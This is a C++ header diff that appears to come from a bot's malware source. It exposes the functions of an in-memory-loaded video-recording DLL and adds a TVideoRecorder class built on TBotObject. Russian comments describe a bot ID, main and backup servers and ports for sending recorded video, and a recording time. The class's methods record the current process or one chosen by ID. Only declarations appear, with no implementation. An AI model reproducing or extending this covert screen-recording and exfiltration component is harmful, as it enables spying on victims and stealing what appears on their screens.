@@ -41,13 +41,6 @@ private:
 	typedef VOID (WINAPI *TStartFindFields)();
 	typedef VOID (WINAPI *TStopFindFields)();
 	//
-	TStartRecHwnd     FRecordWnd;
-	TStartRecPid      FRecordProcess;
-	TStopRec          FStop;
-	TResetTimer       FResetTimer;
-	TStartSend        FSendData;
-	TStartFindFields  FStartFindFields;
-	TStopFindFields   FStopFindFields;
 	//
 	HMEMORYMODULE FHandle;
 
@@ -56,8 +49,40 @@ private:
 public:
 	TVideoRecDLL();
 	~TVideoRecDLL();
+
+	TStartRecHwnd     RecordWnd;
+	TStartRecPid      RecordProcess;
+	TStopRec          Stop;
+	TResetTimer       ResetTimer;
+	TStartSend        SendData;
+	TStartFindFields  StartFindFields;
+	TStopFindFields   StopFindFields;
 };
 
+
+
+//****************************************************
+//
+//****************************************************
+class TVideoRecorder : public TBotObject
+{
+private:
+	TVideoRecDLL FDLL;
+public:
+	string UID;        // Идентификатор бота
+    string VideoName;  // имя видео
+	string Server;     // Адрес основного сервера отправки видео
+	string Server2;    // Адрес дополнителтьного сервера отправки видео
+	int    Port;       // Порт основного сервера отправки видео
+	int    Port2;      // Порт дополнительного сервера отправки видео
+	int    RecordTime; // Время записи, в секундах
+
+	TVideoRecorder();
+	~TVideoRecorder();
+
+	void ReccordProcess(DWORD PID);
+	void ReccordCurrentProcess();
+};
 
 
 
